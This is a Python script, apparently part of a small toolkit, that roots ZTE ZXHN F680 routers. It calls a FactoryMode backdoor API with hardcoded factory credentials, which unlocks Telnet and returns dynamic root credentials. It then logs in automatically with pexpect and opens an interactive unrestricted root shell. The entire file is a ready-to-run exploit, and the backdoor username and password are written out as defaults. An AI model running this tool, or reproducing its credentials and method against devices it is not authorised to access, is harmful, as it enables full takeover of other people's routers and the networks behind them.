#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Automated ZTE Root Shell Launcher
Unlocks FactoryMode backdoor, retrieves dynamic root credentials,
and drops directly into an interactive Mode 2 unrestricted root shell.
"""

import argparse
import os
import shutil
import sys
import time

try:
    import pexpect
except ImportError:
    print("[-] Error: 'pexpect' package is required.")
    print("    Install dependencies via: pip install -r requirements.txt")
    sys.exit(1)

# Import local sibling module
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from zte_factorymode import unlock_factory_telnet
except ImportError as e:
    print(f"[-] Error loading zte_factorymode: {e}")
    print("    Make sure dependencies are installed: pip install -r requirements.txt")
    sys.exit(1)


def unlock_and_connect(ip: str = "192.168.11.1", port: int = 80,
                       user: str = "factorymode", password: str = "nE%jA@5b",
                       timeout: int = 15):
    if not shutil.which("telnet"):
        print("[-] Error: 'telnet' command is not installed on this system.")
        print("    Install it with: sudo apt install telnet  (or brew install telnet)")
        sys.exit(1)

    print(f"[*] Contacting ZTE FactoryMode API at http://{ip}:{port}...")
    creds = unlock_factory_telnet(ip=ip, port=port, users=[user], passwords=[password], verbose=False)
    if not creds:
        print(f"[-] Failed to unlock Telnet on {ip}.")
        print("    Ensure the router is powered on, reachable, and you are on the same subnet.")
        sys.exit(1)

    t_user, t_pass = creds
    print(f"[+] Telnet unlocked! Dynamic credentials:")
    print(f"    Username: {t_user}")
    print(f"    Password: {t_pass}")
    print(f"[*] Spawning interactive Telnet session to {ip}:23...")

    time.sleep(0.5)

    try:
        child = pexpect.spawn(f"telnet {ip}", encoding="latin1", timeout=timeout)
        child.expect(["Login:", "login:"], timeout=timeout)
        child.sendline(t_user)
        child.expect(["Password:", "password:"], timeout=timeout)
        child.sendline(t_pass)
        child.expect([r"/ #", "#", r"\$"], timeout=timeout)

        print("[+] Logged in successfully! Dropping into unrestricted Mode 2 Root shell:\n")
        sys.stdout.write(child.after)
        sys.stdout.flush()
        child.interact()
    except pexpect.exceptions.TIMEOUT:
        print(f"\n[-] Timed out waiting for router prompt on {ip}.")
        print("    You can still try connecting manually:")
        print(f"    telnet {ip}  (User: {t_user} / Pass: {t_pass})")
        sys.exit(1)
    except pexpect.exceptions.EOF:
        print(f"\n[-] Connection closed by router at {ip}.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Telnet session error: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="ZTE ZXHN F680 One-Click Root Shell Launcher")
    parser.add_argument("target_ip", nargs="?", default="192.168.11.1",
                        help="Router IP address (default: 192.168.11.1)")
    parser.add_argument("--port", type=int, default=80, help="HTTP port (default: 80)")
    parser.add_argument("--user", default="factorymode", help="Factory user (default: factorymode)")
    parser.add_argument("--pass", dest="password", default="nE%jA@5b", help="Factory pass (default: nE%%jA@5b)")
    parser.add_argument("--timeout", type=int, default=15, help="Connection timeout in seconds (default: 15)")

    args = parser.parse_args()
    unlock_and_connect(ip=args.target_ip, port=args.port, user=args.user,
                       password=args.password, timeout=args.timeout)


if __name__ == "__main__":
    main()
